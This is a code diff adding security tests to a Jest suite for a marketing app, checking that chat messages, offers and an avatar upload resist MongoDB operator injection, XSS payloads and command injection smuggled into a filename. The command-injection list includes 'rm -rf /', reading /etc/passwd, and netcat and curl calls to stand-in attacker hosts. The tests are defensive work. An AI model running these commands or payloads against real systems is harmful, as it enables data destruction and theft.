@@ -35,6 +35,8 @@ const { connect, closeDatabase, clearDatabase } = require('../helpers/database')
 const User = require('../../models/User');
 const Offer = require('../../models/offer');
 const Deal = require('../../models/deal');
+const ChatRoom = require('../../models/ChatRoom');
+const Message = require('../../models/Message');
 const { generateTestToken } = require('../helpers/auth');
 const bcrypt = require('bcrypt');
 
@@ -42,6 +44,7 @@ describe('Security Tests', () => {
   let testUser;
   let testToken;
   let maliciousUser;
+  let testChat;
 
   beforeAll(async () => {
     await connect();
@@ -92,6 +95,15 @@ describe('Security Tests', () => {
         businessVentures: '',
         portfolio: [],
         totalFollowers: 500
+      }
+    });
+
+    // Create test chat for XSS testing
+    testChat = await ChatRoom.create({
+      participants: [testUser._id, maliciousUser._id],
+      unreadCount: {
+        [testUser._id.toString()]: 0,
+        [maliciousUser._id.toString()]: 0
       }
     });
   });
@@ -421,6 +433,113 @@ describe('Security Tests', () => {
           const offer = await Offer.findOne({ offerName: new RegExp('Legitimate Offer') });
           expect(offer.offerName).not.toContain('<script>');
           expect(offer.description).not.toContain('<script>');
+        }
+      });
+
+      it('should prevent MongoDB operator injection in all query parameters', async () => {
+        // Test various endpoints with operator injection attempts
+        const endpoints = [
+          { method: 'get', path: '/api/users/profile', query: { id: { $ne: null } } },
+          { method: 'get', path: '/api/marketer/offers', query: { status: { $in: ['Sent', 'Accepted'] }, marketerId: { $exists: true } } },
+          { method: 'post', path: '/api/users/search', body: { categories: { $elemMatch: { $regex: '.*' } } } },
+        ];
+
+        for (const endpoint of endpoints) {
+          const req = request(app)[endpoint.method](endpoint.path)
+            .set('x-user-id', testUser._id.toString());
+
+          if (endpoint.query) {
+            req.query(endpoint.query);
+          }
+          if (endpoint.body) {
+            req.send(endpoint.body);
+          }
+
+          const response = await req;
+          
+          // Should not allow operator injection
+          expect(response.status).not.toBe(500);
+          if (response.body && response.body.error) {
+            expect(response.body.error).not.toMatch(/Cast to ObjectId failed/);
+          }
+        }
+      });
+
+      it('should sanitize all user-generated content fields', async () => {
+        // Test comprehensive XSS prevention across all content fields
+        const xssPayloads = {
+          basic: '<script>alert(1)</script>',
+          encoded: '&lt;script&gt;alert(1)&lt;/script&gt;',
+          eventHandler: '<img src=x onerror=alert(1)>',
+          dataUri: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
+          svg: '<svg onload=alert(1)>',
+          style: '<style>@import "javascript:alert(1)";</style>',
+          meta: '<meta http-equiv="refresh" content="0;javascript:alert(1)">',
+        };
+
+        for (const [type, payload] of Object.entries(xssPayloads)) {
+          // Test message creation
+          const messageResponse = await request(app)
+            .post(`/api/chats/${testChat._id}/messages`)
+            .set('x-user-id', testUser._id.toString())
+            .send({
+              text: payload,
+              receiverId: maliciousUser._id.toString()
+            });
+
+          if (messageResponse.status === 201) {
+            const message = await Message.findById(messageResponse.body._id);
+            expect(message.text).not.toContain('<script');
+            expect(message.text).not.toContain('javascript:');
+            expect(message.text).not.toContain('onerror=');
+          }
+
+          // Test offer description
+          const offerResponse = await request(app)
+            .post('/api/marketer/offers')
+            .set('x-user-id', testUser._id.toString())
+            .send({
+              creatorId: maliciousUser._id.toString(),
+              offerName: 'Safe Offer',
+              proposedAmount: 1000,
+              currency: 'USD',
+              platforms: [{ platform: 'Instagram', handle: '@test', followersCount: 1000 }],
+              deliverables: ['Post'],
+              desiredReviewDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
+              desiredPostDate: new Date(Date.now() + 14 * 24 * 60 * 60 * 1000),
+              description: payload
+            });
+
+          if (offerResponse.status === 201) {
+            const offer = await Offer.findById(offerResponse.body._id);
+            expect(offer.description).not.toContain('<script');
+            expect(offer.description).not.toContain('javascript:');
+          }
+        }
+      });
+
+      it('should prevent command injection in system operations', async () => {
+        // Test for command injection prevention
+        const commandInjectionPayloads = [
+          '; ls -la',
+          '`rm -rf /`',
+          '$(cat /etc/passwd)',
+          '| nc attacker.com 1234',
+          '&& curl http://evil.com/steal',
+        ];
+
+        for (const payload of commandInjectionPayloads) {
+          // Test file upload with malicious filename
+          const response = await request(app)
+            .post('/api/users/upload-avatar')
+            .set('x-user-id', testUser._id.toString())
+            .attach('avatar', Buffer.from('test'), {
+              filename: `avatar${payload}.jpg`,
+              contentType: 'image/jpeg'
+            });
+
+          // Should handle safely without executing commands
+          expect(response.status).toBeLessThan(500);
         }
       });
     });
